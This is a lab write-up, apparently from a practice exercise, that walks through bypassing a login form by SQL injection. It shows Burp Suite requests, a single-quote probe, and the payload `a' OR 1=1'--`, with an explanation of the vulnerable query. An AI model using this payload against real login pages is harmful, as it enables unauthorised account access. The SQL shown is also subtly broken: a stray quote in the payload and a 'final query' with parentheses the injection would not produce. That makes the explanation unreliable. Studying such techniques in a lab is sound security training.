
---

# 📖 High-Level Summary:

This lab demonstrates a **SQL Injection login bypass** by exploiting logical flaws in SQL queries. The injection payload manipulates the application's SQL query to always return a **true condition**, enabling unauthorized access without knowing the password.

---

# 📚 Definition Bank:

|**Term**|**Definition**|**Key Notes**|
|---|---|---|
|**SQL Injection (SQLi)**|A web vulnerability that allows attackers to interfere with an application’s database queries.|Exploits improperly sanitized inputs to execute arbitrary SQL commands.|
|**Login Bypass**|A SQL Injection technique that manipulates the authentication query to always evaluate to true.|Commonly achieved by appending `OR 1=1` to bypass password checks.|
|**Logical Operators**|Operators like `AND` and `OR` are used in SQL to combine multiple conditions.|**`OR 1=1`** ensures that the condition evaluates to true regardless of other inputs.|

---

# 🎯 Steps and Commands:

### Step 1: Identify SQL Injection

1. Use valid credentials to log in:
    - **Credentials**:
        
        ```plaintext
        Username: admin
        Password: admin
        ```
        
2. Observe the POST request in Burp Suite:
    
    ```plaintext
    POST /v1/002.php
    Body:
    {
      "username": "admin",
      "password": "admin"
    }
    ```
    
3. Test for SQL injection by replacing `"admin"` with a single quote (`'`):
    - Updated Request:
        
        ```json
        {
          "username": "admin",
          "password": "'"
        }
        ```
        
    - **Response:** A SQL error confirms the application is vulnerable to injection.

---

### Step 2: Understand the SQL Query

- The application likely runs a query like this:
    
    ```sql
    SELECT * FROM users WHERE username='$username' AND password='$password'
    ```
    
- Injecting the payload manipulates it as follows:
    
    ```sql
    SELECT * FROM users WHERE username='admin' AND password='a' OR 1=1'
    ```
    
    - **Explanation:**
        - `username='admin'` is **true** because "admin" is a valid username.
        - `password='a' OR 1=1` evaluates to **true** because `1=1` is always true.
        - The final condition becomes true, bypassing authentication.

---

### Step 3: Craft the Payload

1. **Payload:**
    
    ```plaintext
    a' OR 1=1'--
    ```
    
    - **Breaking It Down:**
        - The single quote (`'`) closes the `password` input.
        - `OR 1=1` ensures the condition is true.
        - `--` comments out the rest of the SQL query to prevent syntax errors.
2. **Final SQL Query:**
    
    ```sql
    SELECT * FROM users WHERE username='admin' AND (password='a' OR 1=1)--
    ```
    

---

### Step 4: Execute the Attack

1. Send the payload via Burp Suite Repeater:
    
    - Updated Request:
        
        ```json
        {
          "username": "admin",
          "password": "a' OR 1=1'--"
        }
        ```
        
    - **Response:** A successful login message.
2. Test in the Login Form:
    
    - Input:
        - Username: `admin`
        - Password: `a' OR 1=1'--`
    - **Result:** A modal popup confirms successful login.

---

# ✅ Key Takeaways:

1. **Logical Flaws:** SQL injection exploits logical conditions (e.g., `OR 1=1`) to bypass authentication checks.
2. **Injection Placement:** Understanding query structure is critical to crafting successful payloads.
3. **Quotes and Syntax:** Properly closing and balancing quotes ensures the payload does not cause syntax errors.

---